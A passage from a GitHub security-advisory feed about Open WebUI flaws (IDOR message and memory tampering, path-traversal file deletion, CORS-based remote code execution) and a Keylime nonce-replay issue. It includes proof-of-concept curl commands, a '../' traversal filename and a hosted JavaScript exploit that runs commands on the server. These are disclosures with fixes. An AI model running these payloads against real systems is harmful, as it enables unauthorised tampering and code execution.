<p><strong>Example showing a memory being deleted then restored by a different user than its owner</strong></p>
<pre><code>DELETE /api/v1/memories/d6802d76-a50f-4255-b68e-0f60c335e043 HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE
User-Agent: Test
accept: application/json
Connection: keep-alive

---

HTTP/1.1 200 OK
date: Fri, 18 Jul 2025 19:31:19 GMT
server: uvicorn
content-length: 4
content-type: application/json
x-process-time: 0

true
</code></pre>
<pre><code>POST /api/v1/memories/query HTTP/1.1
Host: localhost:8080
Content-Length: 19
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE
User-Agent: Test
accept: application/json
Content-Type: application/json
Connection: keep-alive

{
  "content": ""
}

---

HTTP/1.1 200 OK
date: Fri, 18 Jul 2025 19:32:31 GMT
server: uvicorn
content-length: 63
content-type: application/json
x-process-time: 0

{"ids":[[]],"documents":[[]],"metadatas":[[]],"distances":[[]]}
</code></pre>
<pre><code>POST /api/v1/memories/d6802d76-a50f-4255-b68e-0f60c335e043/update HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE
User-Agent: Test
Accept: application/json
Content-Type: application/json
Connection: keep-alive
Content-Length: 23

{
  "content": ""
}

---

HTTP/1.1 200 OK
date: Fri, 18 Jul 2025 19:33:05 GMT
server: uvicorn
content-length: 172
content-type: application/json
x-process-time: 0

{"id":"d6802d76-a50f-4255-b68e-0f60c335e043","user_id":"a050e531-356b-4673-8772-ff1aecdf3273","content":"My secret content","updated_at":1752864797,"created_at":1752784616}
</code></pre>
<pre><code>POST /api/v1/memories/query HTTP/1.1
Host: localhost:8080
Content-Length: 19
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE
User-Agent: Test
accept: application/json
Content-Type: application/json
Connection: keep-alive

{
  "content": ""
}

---

HTTP/1.1 200 OK
date: Fri, 18 Jul 2025 19:33:34 GMT
server: uvicorn
content-length: 187
content-type: application/json
x-process-time: 0

{"ids":[["d6802d76-a50f-4255-b68e-0f60c335e043"]],"documents":[["My secret content"]],"metadatas":[[{"created_at":1752784616,"updated_at":1752864797}]],"distances":[[0.6216812525921495]]}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Potential disclosure of sensitive data stored within a user's memories. Disclosure of unique user ID values to non-admins when viewing a memory.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-hmjq-crxp-7rjw">https://github.com/open-webui/open-webui/security/advisories/GHSA-hmjq-crxp-7rjw</a></li>
<li><a href="https://github.com/advisories/GHSA-hmjq-crxp-7rjw">https://github.com/advisories/GHSA-hmjq-crxp-7rjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hmjq-crxp-7rjw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-11T14:25:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keylime] Duplicate Advisory: Keylime has a hardcoded attestation challenge nonce that allows replay attacks]]></title>
        <id>https://github.com/advisories/GHSA-wc6p-4gwj-jcr8</id>
        <link href="https://github.com/advisories/GHSA-wc6p-4gwj-jcr8"/>
        <updated>2026-05-11T14:08:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-q8w6-w55c-ccv5. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>A flaw was found in Keylime. An attacker with root access on an enrolled monitored machine, where the Keylime agent runs, can exploit a vulnerability in the Keylime verifier. The verifier uses a hardcoded challenge nonce for Trusted Platform Module (TPM) quote attestation instead of a cryptographically random value. This allows the attacker to stockpile valid TPM quotes and replay them to evade detection after compromising the system. This issue affects only the push model deployment.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6420">https://nvd.nist.gov/vuln/detail/CVE-2026-6420</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-6420">https://access.redhat.com/security/cve/CVE-2026-6420</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2458889">https://bugzilla.redhat.com/show_bug.cgi?id=2458889</a></li>
<li><a href="https://github.com/advisories/GHSA-wc6p-4gwj-jcr8">https://github.com/advisories/GHSA-wc6p-4gwj-jcr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wc6p-4gwj-jcr8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-06T12:30:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI's Improper Authorization in Standard Channels Allows Message Updates with Read Permission]]></title>
        <id>https://github.com/advisories/GHSA-jgj3-r8hr-9pjw</id>
        <link href="https://github.com/advisories/GHSA-jgj3-r8hr-9pjw"/>
        <updated>2026-05-11T14:05:27.000Z</updated>
        <content type="html"><![CDATA[<h2 id="vulnerability-description">Vulnerability Description</h2>
<p>In standard channels (i.e., channels whose <code>channel.type</code> is neither <code>group</code> nor <code>dm</code>), the endpoint</p>
<p><code>POST /api/v1/channels/{channel_id}/messages/{message_id}/update</code> can be accessed with <strong>read permission only</strong>.</p>
<p>When <code>access_control</code> is set to <code>None</code>, the authorization check <code>has_access(..., type="read")</code> evaluates to <code>True</code>, allowing users who are <strong>not the message owner</strong> to update messages.</p>
<p>As a result, unauthorized modification of other users’ messages is possible.</p>
<hr>
<h2 id="attack-prerequisites">Attack Prerequisites</h2>
<ul>
<li>The attacker is an authenticated user (role <code>user</code> or higher)</li>
<li>The target channel is a standard channel (i.e., not <code>group</code> or <code>dm</code>)</li>
<li><code>access_control</code> is <code>None</code> or allows <code>read</code> access</li>
<li>The attacker can obtain the target <code>message_id</code> (e.g., via the channel’s message list)</li>
</ul>
<h2 id="attack-scenario">Attack Scenario</h2>
<ol>
<li><p>The attacker (User B) retrieves another user’s <code>message_id</code> from the message list in a standard channel</p>
</li>
<li><p>The attacker sends a request to</p>
<p> <code>POST /api/v1/channels/{channel_id}/messages/{message_id}/update</code></p>
</li>
<li><p>The message authored by another user (User A) is successfully updated</p>
</li>
</ol>
<h2 id="potential-impact">Potential Impact</h2>
<ul>
<li>Unauthorized modification of other users’ messages (violation of data integrity)</li>
</ul>
<h1 id="steps-to-reproduce">Steps to Reproduce</h1>
<ol>
<li>Log in as an administrator</li>
</ol>
<img width="3334" height="1668" alt="image" src="https://github.com/user-attachments/assets/b20323d3-c050-4438-8912-193a417654bc">


<ol start="2">
<li>Create User A</li>
</ol>
<img width="3346" height="788" alt="image" src="https://github.com/user-attachments/assets/b9e4fb8a-b14e-4a4b-b012-02ccfba52fca">

<ol start="3">
<li>Create User B</li>
</ol>
<img width="3354" height="796" alt="image" src="https://github.com/user-attachments/assets/f3cf6892-e6c9-4778-b471-f1cc0deec6c8">


<ol start="4">
<li>Log in as User A</li>
</ol>
<img width="3360" height="1668" alt="image" src="https://github.com/user-attachments/assets/5264ee07-f5c5-4bbe-ad4f-da69fb540fc9">


<ol start="5">
<li>Log in as User B</li>
</ol>
<img width="3354" height="1670" alt="image" src="https://github.com/user-attachments/assets/f112f8e8-b3e2-4e65-b226-c7b6c986f3bb">


<ol start="6">
<li>As the administrator, create a new channel</li>
</ol>
<img width="2582" height="988" alt="image" src="https://github.com/user-attachments/assets/bc012d9a-f884-4c83-b6bb-d1e5399f61bb">


<ol start="7">
<li>As User A, post a new message in the channel</li>
</ol>
<img width="2626" height="962" alt="image" src="https://github.com/user-attachments/assets/d7ff12c2-fe17-44f0-aaf9-5ce2bac9a378">


<ol start="8">
<li>As User B, edit User A’s message</li>
</ol>
<img width="2604" height="958" alt="image" src="https://github.com/user-attachments/assets/8e19ec3e-fdda-4d36-acd5-f3e1fd3402dd">


<ol start="9">
<li>Confirm that User A’s message has been modified without authorization</li>
</ol>
<img width="2378" height="1976" alt="image" src="https://github.com/user-attachments/assets/6415fd41-ac68-4d42-83c9-6297caee1fb4">


<h2 id="affected-files-and-line-numbers">Affected Files and Line Numbers</h2>
<ul>
<li><p><code>backend/open_webui/routers/channels.py:1417–1460</code></p>
<p>  The authorization check in <code>update_message_by_id</code> allows access with <strong>read</strong> permission</p>
</li>
<li><p><code>backend/open_webui/utils/access_control.py:124–135</code></p>
<p>  When <code>access_control=None</code> and <code>strict=True</code>, <strong>read</strong> access is permitted</p>
</li>
<li><p><code>backend/open_webui/models/messages.py:341–358</code></p>
<p>  The update logic does not enforce any message ownership check</p>
</li>
</ul>
<h2 id="recommended-mitigation">Recommended Mitigation</h2>
<p>Update the condition in</p>
<p><code>backend/open_webui/routers/channels.py:1451–1456</code></p>
<p>by changing the permission check from <strong><code>read</code></strong> to <strong><code>write</code></strong>, so that only administrators, message owners, or users with write permission can update messages.</p>
<h3 id="proposed-changes">Proposed Changes</h3>
<ul>
<li><p>For standard channels, change the update permission requirement from</p>
<p>  <code>has_access(..., type="read")</code> to <code>has_access(..., type="write")</code></p>
</li>
<li><p>Preserve the existing ownership check (<code>message.user_id == user.id</code>)</p>
</li>
</ul>
<h2 id="ai-usage"><strong>AI Usage</strong></h2>
<ul>
<li>Translation from Japanese to English</li>
<li>CWE classification and assessment</li>
<li>Affected Files and Line Numbers</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-jgj3-r8hr-9pjw">https://github.com/open-webui/open-webui/security/advisories/GHSA-jgj3-r8hr-9pjw</a></li>
<li><a href="https://github.com/advisories/GHSA-jgj3-r8hr-9pjw">https://github.com/advisories/GHSA-jgj3-r8hr-9pjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jgj3-r8hr-9pjw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-11T14:05:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI's Insecure Message Access Breaks Authorization]]></title>
        <id>https://github.com/advisories/GHSA-jxwr-g6r6-j3fx</id>
        <link href="https://github.com/advisories/GHSA-jxwr-g6r6-j3fx"/>
        <updated>2026-05-11T14:04:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>There's an IDOR in the channels message management system that allows authenticated users to modify or delete any message within channels they have read access to. The vulnerability exists in the message update and delete endpoints, which implement channel-level authorization but completely lack message ownership validation.</p>
<p>While the frontend correctly implements ownership checks (showing edit/delete buttons only for message owners or admins), the backend APIs bypass these protections by only validating channel access permissions without verifying that the requesting user owns the target message. This creates a client-side security control bypass where attackers can directly call the APIs to modify other users' messages.</p>
<p>The vulnerability affects both message content modification and deletion, allowing users to tamper with message integrity and audit trails in collaborative channel environments.</p>
<h3 id="source---sink-analysis">Source - Sink Analysis</h3>
<p><strong>Source:</strong> User-controlled <code>message_id</code> parameter in URL path</p>
<p><strong>Call Chain:</strong></p>
<ol>
<li>FastAPI route handlers <code>update_message_by_id()</code> (line 450) and <code>delete_message_by_id()</code> (line 630) in <code>backend/open_webui/routers/channels.py</code></li>
<li>Channel-level authorization check: <code>has_access(user.id, type="read", access_control=channel.access_control)</code> at lines 457 and 637</li>
<li>Message retrieval: <code>Messages.get_message_by_id(message_id)</code> at lines 467 and 647  </li>
<li>Channel ID validation: <code>if message.channel_id != id:</code> at lines 472 and 652</li>
<li><strong>Missing:</strong> Message ownership validation (<code>message.user_id == user.id</code>)</li>
<li><strong>Sink:</strong> <code>Messages.update_message_by_id(message_id, form_data)</code> at line 476 or <code>Messages.delete_message_by_id(message_id)</code> at line 658 - modifies any message without ownership verification</li>
</ol>
<h3 id="proof-of-concept">Proof of Concept</h3>
<ol>
<li>Deploy Open WebUI with channels enabled (<code>ENABLE_CHANNELS=true</code>)</li>
<li>Create scenario:<ul>
<li>User A creates a channel and grants User B read access</li>
<li>User A posts a message in the channel</li>
<li>User B observes the message_id from the frontend</li>
</ul>
</li>
<li>Exploit: User B sends direct API requests bypassing frontend controls:</li>
</ol>
<p>Message Update:</p>
<pre><code class="language-bash">curl -X POST "http://localhost:8080/api/v1/channels/{channel_id}/messages/{victim_message_id}/update" \
     -H "Authorization: Bearer {attacker_token}" \
     -H "Content-Type: application/json" \
     -d '{"content": "Malicious content injected by attacker"}'
</code></pre>
<p>Message Deletion:</p>
<pre><code class="language-bash">curl -X DELETE "http://localhost:8080/api/v1/channels/{channel_id}/messages/{victim_message_id}/delete" \
     -H "Authorization: Bearer {attacker_token}"
</code></pre>
<ol start="4">
<li>Result: Victim's message is modified or deleted despite User B only having read permissions</li>
</ol>
<h3 id="impact">Impact</h3>
<ul>
<li>Users can modify other users' message content within shared channels</li>
<li>Read-only users gain write/delete capabilities over other users' content</li>
</ul>
<h3 id="remediation">Remediation</h3>
<p>Implement proper message ownership validation in the update and delete endpoints by adding ownership checks that follow the established security pattern used throughout the codebase. First, add a validation condition after the existing message retrieval to ensure only message owners or admins can modify messages: <code>if user.role != "admin" and message.user_id != user.id and not has_access(user.id, type="write", access_control=channel.access_control)</code> then raise a 403 Forbidden exception. Second, change the existing permission check from <code>type="read"</code> to <code>type="write"</code> for both update and delete operations to align with the access control model used in other routers (notes, prompts, knowledge, etc.).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-jxwr-g6r6-j3fx">https://github.com/open-webui/open-webui/security/advisories/GHSA-jxwr-g6r6-j3fx</a></li>
<li><a href="https://github.com/advisories/GHSA-jxwr-g6r6-j3fx">https://github.com/advisories/GHSA-jxwr-g6r6-j3fx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jxwr-g6r6-j3fx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-11T14:04:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI Arbitrary File Write, Delete via Path Traversal]]></title>
        <id>https://github.com/advisories/GHSA-j3fw-wc48-29g3</id>
        <link href="https://github.com/advisories/GHSA-j3fw-wc48-29g3"/>
        <updated>2026-05-11T14:03:27.000Z</updated>
        <content type="html"><![CDATA[<p>** CONFIDENTIAL **</p>
<h2 id="vulnerability-disclosure-analysis-documentation">Vulnerability Disclosure Analysis Documentation</h2>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<ol>
<li>Discoverer: Taylor Pennington of KoreLogic, Inc.</li>
<li>Date Submitted: June 11, 2024</li>
<li>Title: Open WebUI Arbitrary File Write, Delete via Path Traversal</li>
<li>High-level Summary:
  Attacker controlled files can be uploaded to arbitrary locations on the web
  server's filesystem by abusing a path traversal vulnerability. After the
  file is written, it is deleted.</li>
<li>Affected Vendor: Open WebUI</li>
<li>Affected Product(s): Open WebUI (Formerly Ollama WebUI)</li>
<li>Affected Version(s): 0.1.105</li>
<li>Platform/OS: Debian GNU/Linux 12 (bookworm)</li>
<li>Vector: HTTP web interface</li>
<li>CWE: 22 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</li>
<li>Technical Analysis:</li>
</ol>
<p>   When attaching files to a prompt by clicking the plus sign (+) on the left of
   the message input box when using the Open WebUI HTTP interface, the file is
   uploaded to a static upload directory. If the file is an audio file
   it will be sent to a second API that will attempt to transcribe it.</p>
<p>   The name of the file is derived from the original HTTP upload request and is
   not validated or sanitized. This allows for users to upload files with names
   containing dot-segments in the file path and traverse out of the intended
   uploads directory. Effectively, users can upload files anywhere on the
   filesystem the user running the web server has permission.</p>
<p>   This can be visualized by examining the python code for the
   "/ollama/models/upload" API route (<a href="https://github.com/open-webui/open-webui/blob/0399a69b73de9789c4221acedea70d528e1346c4/backend/apps/ollama/main.py#L1063-L1127">https://github.com/open-webui/open-webui/blob/0399a69b73de9789c4221acedea70d528e1346c4/backend/apps/ollama/main.py#L1063-L1127</a>):</p>
<pre><code>def upload_model(file: UploadFile = File(...), url_idx: Optional[int] = None):
 if url_idx == None:
     url_idx = 0
 ollama_url = app.state.OLLAMA_BASE_URLS[url_idx]

 file_path = f"{UPLOAD_DIR}/{file.filename}"

 # Save file in chunks
 with open(file_path, "wb+") as f:
     for chunk in file.file:
         f.write(chunk)

 def file_process_stream():
     nonlocal ollama_url
     total_size = os.path.getsize(file_path)
     chunk_size = 1024 * 1024
     try:
         with open(file_path, "rb") as f:
             total = 0
             done = False

             while not done:
                 chunk = f.read(chunk_size)
                 if not chunk:
                     done = True
                     continue

                 total += len(chunk)
                 progress = round((total / total_size) * 100, 2)

                 res = {
                     "progress": progress,
                     "total": total_size,
                     "completed": total,
                 }
                 yield f"data: {json.dumps(res)}\n\n"

             if done:
                 f.seek(0)
                 hashed = calculate_sha256(f)
                 f.seek(0)

                 url = f"{ollama_url}/api/blobs/sha256:{hashed}"
                 response = requests.post(url, data=f)

                 if response.ok:
                     res = {
                         "done": done,
                         "blob": f"sha256:{hashed}",
                         "name": file.filename,
                     }
                     os.remove(file_path)
                     yield f"data: {json.dumps(res)}\n\n"
                 else:
                     raise Exception(
                         "Ollama: Could not create blob, Please try again."
                     )

     except Exception as e:
         res = {"error": str(e)}
         yield f"data: {json.dumps(res)}\n\n"

 return StreamingResponse(file_process_stream(), media_type="text/event-stream")
 ```

 The model is temporarily written to disk in chunks and then the data is sent to
 another internal API. Once the file is successfully passed, the file is removed
 from the disk. Note line 1116, `os.remove(file_path)`.

 This has an affect of stomping on and ultimately deleting any file that the user
 of the open-webui service has permissions over.

 It may be possible to continue sending chunks to the file slowly and create
 a race condition however, this was not validated.

12. Proof-of-Concept:

 First, create a file under the `/tmp` directory named `DELETE_ME` while
 logged in as the user account of the web application or chown the file to be
 owned by the open-webui user.

 ```
 # su ollama
 # touch /tmp/DELETE_ME
 ```

Execute the following cURL command after replacing the exported `JWT` value for a valid user session:

 ```
 export JWT="JWT_HERE"; curl -s -X $'POST' \
 -H $'Host: openwebui.example.com' -H $'Content-Length: 206' -H "Authorization: Bearer ${JWT}" -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW' \
 --data-binary $'------WebKitFormBoundary7MA4YWxkTrZu0gW\x0d\x0aContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../tmp/DELETE_ME\"\x0d\x0aContent-Type: image/png\x0d\x0a\x0d\x0a\x0d\x0a------WebKitFormBoundary7MA4YWxkTrZu0gW--' \
 $'https://openwebui.example.com/ollama/models/upload'
 ```

 Verify that `/tmp/DELETE_ME` has been deleted.

13. Mitigation Recommendation: Modify line 1070 (https://github.com/open-webui/open-webui/blob/0399a69b73de9789c4221acedea70d528e1346c4/backend/apps/ollama/main.py#L1070) to: 
</code></pre>
<p>filename = os.path.basename(file.filename)
file_path = f"{UPLOAD_DIR}/{filename}"</p>
<pre><code>### References

- &lt;https://github.com/open-webui/open-webui/security/advisories/GHSA-j3fw-wc48-29g3&gt;
- &lt;https://github.com/advisories/GHSA-j3fw-wc48-29g3&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j3fw-wc48-29g3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-11T14:03:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI has a CORS misconfiguration and session validation issue]]></title>
        <id>https://github.com/advisories/GHSA-6xcp-7mpr-m7wm</id>
        <link href="https://github.com/advisories/GHSA-6xcp-7mpr-m7wm"/>
        <updated>2026-05-11T14:02:05.000Z</updated>
        <content type="html"><![CDATA[<h1 id="github-security-lab-ghsl-vulnerability-report-open-webui-ghsl-2024-174-ghsl-2024-175">GitHub Security Lab (GHSL) Vulnerability Report, open-webui: <code>GHSL-2024-174</code>, <code>GHSL-2024-175</code></h1>
<p>The <a href="https://securitylab.github.com">GitHub Security Lab</a> team has identified potential security vulnerabilities in <a href="https://github.com/open-webui/open-webui">open-webui</a>.</p>
<p>We are committed to working with you to help resolve these issues. In this report you will find everything you need to effectively coordinate a resolution of these issues with the GHSL team.</p>
<p>If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at <code>securitylab@github.com</code> (please include <code>GHSL-2024-174</code> or <code>GHSL-2024-175</code> as a reference). See also <a href="https://github.blog/2022-04-22-removing-the-stigma-of-a-cve/">this blog post</a> written by GitHub's Advisory Curation team which explains what CVEs and advisories are, why they are important to track vulnerabilities and keep downstream users informed, the CVE assigning process, and how they are used to keep open source software secure.</p>
<p>If you are <em>NOT</em> the correct point of contact for this report, please let us know!</p>
<h2 id="summary">Summary</h2>
<p>Due to a CORS misconfiguration and session validation issue, an attacker may be able to perform a 1 click attack against browsers with admin access to openwebui, resulting in remote code execution in the openwebui instance. The openwebui application runs as root in Docker container's default setup, which allows for complete compromise of the container.</p>
<h2 id="project">Project</h2>
<p>open-webui</p>
<h2 id="tested-version">Tested Version</h2>
<p><a href="https://github.com/open-webui/open-webui/releases/tag/v0.3.10">v0.3.10</a></p>
<h2 id="details">Details</h2>
<h3 id="issue-1-cors-misconfiguration-on-multiple-routers-ghsl-2024-174">Issue 1: CORS misconfiguration on multiple routers (<code>GHSL-2024-174</code>)</h3>
<p>CORS misconfigurations exist on multiple routers of open-webui which results in allowing arbitrary websites to make authenticated cross site requests to openwebui. Accounts with access to the <code>/api/v1/functions</code> endpoint (admins) can execute arbitrary code on the openwebui instance. </p>
<p>The following pattern occurs at the following routers:</p>
<ol>
<li><a href="https://github.com/open-webui/open-webui/blob/v0.3.10/backend/apps/webui/main.py#L92">backend/apps/webui/main.py</a></li>
<li><a href="https://github.com/open-webui/open-webui/blob/v0.3.10/backend/apps/audio/main.py#L58">backend/apps/audio/main.py</a></li>
<li><a href="https://github.com/open-webui/open-webui/blob/v0.3.10/backend/apps/images/main.py#L60">backend/apps/images/main.py</a></li>
<li><a href="https://github.com/open-webui/open-webui/blob/v0.3.10/backend/apps/rag/main.py#L246">backend/apps/rag/main.py</a></li>
<li><a href="https://github.com/open-webui/open-webui/blob/v0.3.10/backend/apps/openai/main.py#L47">backend/apps/openai/main.py</a></li>
<li><a href="https://github.com/open-webui/open-webui/blob/v0.3.10/backend/apps/ollama/main.py#L62">backend/apps/ollama/main.py</a></li>
<li><a href="https://github.com/open-webui/open-webui/blob/v0.3.10/backend/main.py#L881">backend/main.py</a></li>
</ol>
<pre><code class="language-python">app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
</code></pre>
<h4 id="impact">Impact</h4>
<p>This issue may lead to <code>Remote Code Execution</code>.</p>
<h4 id="remediation">Remediation</h4>
<p>The FastAPI CORS middleware is not safe by default, meaning it reflects the origin when specifying <code>allow_origins=["*"]</code>.  Remove the vulnerable, broad origin and allow users to dynamically setup the exact allowed origins via the administration panel or config file, do not allow for broad origins such as <code>"*"</code> or <code>"*.com"</code></p>
<h4 id="proof-of-concept">Proof of Concept</h4>
<p>Host the following code on your website, <code>attacker.com</code>. Open the webpage using Firefox, and click on the webpage as instructed. Check your openwebui host to see the result of the command <code>whoami</code> placed into a newly created file <code>/tmp/whoami.txt</code>. Ensure you have logged into an admin open-webui account </p>
<pre><code class="language-javascript">&lt;body&gt;
    &lt;p&gt;Click here to login.&lt;/p&gt;
    &lt;div id="response"&gt;&lt;/div&gt;
 
    &lt;script&gt;
      //Firefox cross site cookie request bypass
      const url = 'http://localhost:3000/static/favicon.png';
      document.addEventListener("DOMContentLoaded", () =&gt; {
        document.onclick = () =&gt; {
          open(url);
          filter_id = "okok"
//Create a function/filter to write code
fetch('http://localhost:3000/api/v1/functions/create', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    "id": filter_id,
    "name": "test2",
    "meta": {"description": "test2"},
    "content": "from pydantic import BaseModel, Field\nfrom typing import Optional\n\n\nclass Filter:\n    class Valves(BaseModel):\n        priority: int = Field(\n            default=0, description=\"Priority level for the filter operations.\"\n        )\n        max_turns: int = Field(\n            default=8, description=\"Maximum allowable conversation turns for a user.\"\n        )\n        pass\n\n    class UserValves(BaseModel):\n        max_turns: int = Field(\n            default=4, description=\"Maximum allowable conversation turns for a user.\"\n        )\n        pass\n\n    def __init__(self):\n        # Indicates custom file handling logic. This flag helps disengage default routines in favor of custom\n        # implementations, informing the WebUI to defer file-related operations to designated methods within this class.\n        # Alternatively, you can remove the files directly from the body in from the inlet hook\n        # self.file_handler = True\n\n        # Initialize 'valves' with specific configurations. Using 'Valves' instance helps encapsulate settings,\n        # which ensures settings are managed cohesively and not confused with operational flags like 'file_handler'.\n        self.valves = self.Valves()\n        f = open(\"/tmp/whoami.txt\", \"w\")\n        import subprocess\n\n        output = subprocess.getoutput(\"whoami\")\n        f.write(output)\n        f.close()\n        pass\n\n    def inlet(self, body: dict, __user__: Optional[dict] = None) -&gt; dict:\n        return body\n\n    def outlet(self, body: dict, __user__: Optional[dict] = None) -&gt; dict:\n        return body\n"
  }),
  credentials: 'include' // This will send cookies from the origin
})
.then(response =&gt; response.json())
.then(data =&gt; console.log(data))
.catch((error) =&gt; console.error('Error:', error)); 


//Toggle the filter to execute code
fetch(`http://localhost:3000/api/v1/functions/id/${filter_id}/toggle`, {
  method: 'POST',
  credentials: 'include' // This will send cookies from the origin
})
.then(response =&gt; response.json())
.then(data =&gt; console.log(data))
.catch((error) =&gt; console.error('Error:', error)); 
        }
      });
    &lt;/script&gt;
  &lt;/body&gt;
</code></pre>
<h3 id="issue-2-failure-to-invalidate-session-on-logout-ghsl-2024-175">Issue 2: Failure to Invalidate Session on Logout (<code>GHSL-2024-175</code>)</h3>
<p>Openwebui fails to invalidate and clear session cookies after logout. In fact, it seems to reuse the same session cookies. This allows an attacker who has access to previous session cookie details to login at a later point as long as the victim has not closed their browser.</p>
<p>This vulnerability is relevant to the above CORS issue because it no longer requires the user to be logged in to exploit. If the cookie had been properly invalidated/cleared, the CORS issue would only affect logged in users. </p>
<h4 id="impact-1">Impact</h4>
<p>This issue may increase the impact of primitives gained from other security issues.</p>
<h4 id="remediation-1">Remediation</h4>
<p>For every session, new cookies should be generated. When a user logouts, the session cookies from the previous session should be invalidated and removed from the browser's storage.</p>
<h4 id="resources">Resources</h4>
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html">OWASP Recommendation On Sessions</a></p>
<h2 id="github-security-advisories">GitHub Security Advisories</h2>
<p>We recommend you create a private <a href="https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory">GitHub Security Advisory</a> for these findings. This also allows you to invite the GHSL team to collaborate and further discuss these findings in private before they are <a href="https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory">published</a>.</p>
<h2 id="credit">Credit</h2>
<p>These issues were discovered and reported by GHSL team member <a href="https://github.com/Kwstubbs">@Kwstubbs (Kevin Stubbings)</a>.</p>
<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code>securitylab@github.com</code>, please include a reference to <code>GHSL-2024-174</code> or <code>GHSL-2024-175</code> in any communication regarding these issues.</p>
<h2 id="disclosure-policy">Disclosure Policy</h2>
<p>This report is subject to a 90-day disclosure deadline, as described in more detail in our <a href="https://securitylab.github.com/advisories#policy">coordinated disclosure policy</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-6xcp-7mpr-m7wm">https://github.com/open-webui/open-webui/security/advisories/GHSA-6xcp-7mpr-m7wm</a></li>
<li><a href="https://github.com/advisories/GHSA-6xcp-7mpr-m7wm">https://github.com/advisories/GHSA-6xcp-7mpr-m7wm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6xcp-7mpr-m7wm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-11T14:02:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[PraisonAI] PraisonAI's symlink-extraction bypass of `_safe_extractall` writes outside `dest_dir`]]></title>
        <id>https://github.com/advisories/GHSA-9q28-ghcr-c4x3</id>
        <link href="https://github.com/advisories/GHSA-9q28-ghcr-c4x3"/>
        <updated>2026-05-11T13:59:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
